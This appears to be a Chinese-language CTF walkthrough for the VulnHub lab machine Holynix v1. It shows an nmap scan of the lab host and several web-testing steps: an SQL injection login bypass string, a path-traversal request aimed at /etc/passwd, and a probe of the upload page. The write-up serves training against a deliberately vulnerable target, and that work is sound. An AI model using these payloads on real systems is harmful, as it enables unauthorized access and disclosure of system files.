# Holynix：v1

2024-6-5 https://www.vulnhub.com/entry/holynix-v1,20/

difficulty: easy

## IP

192.168.10.193

## Scan

Open Port -> 80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
```

http://192.168.10.193/index.php 点击左侧 login 链接，出现登陆窗口，测试是否存在 sql 注入，用户名和密码都输入 `' or 1=1 -- -` , 可以登陆进入，证明存在 sql 注入。

http://192.168.10.193/index.php?page=login.php 同时注意到登陆页面的链接这里，可能存在 LFI 漏洞。

http://192.168.10.193/index.php?page=../../../../../../etc/passwd 这里提示找不到 404.html ，应该是 index.php 中做了 page 参数判断。

http://192.168.10.193/index.php?page=upload.php 有一个上传文件的功能，但是测试上传提示有限制。

http://192.168.10.193/index?page=employeedir.php 列出的员工信息，找到 Administrator 权限的员工，再次登陆系统。
